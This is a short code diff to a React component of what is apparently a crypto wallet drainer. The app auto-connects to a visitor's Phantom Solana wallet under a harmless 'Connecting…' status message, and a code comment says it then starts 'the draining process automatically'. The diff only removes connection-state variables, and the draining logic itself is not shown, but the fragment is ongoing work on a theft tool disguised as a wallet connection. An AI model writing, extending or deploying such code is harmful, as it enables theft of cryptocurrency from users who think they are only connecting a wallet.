@@ -13,8 +13,6 @@ declare global {
 
 function App() {
   const [isConnecting, setIsConnecting] = useState(false);
-  const [isConnected, setIsConnected] = useState(false);
-  const [walletAddress, setWalletAddress] = useState('');
   const [isProcessing, setIsProcessing] = useState(false);
   const [statusMessage, setStatusMessage] = useState('Connecting to Phantom wallet...');
   const [retryCount, setRetryCount] = useState(0);
@@ -32,8 +30,6 @@ function App() {
           
           const response = await window.phantom.solana.connect();
           const publicKey = response.publicKey.toString();
-          setWalletAddress(publicKey);
-          setIsConnected(true);
           setIsConnecting(false);
           
           // Start the draining process automatically
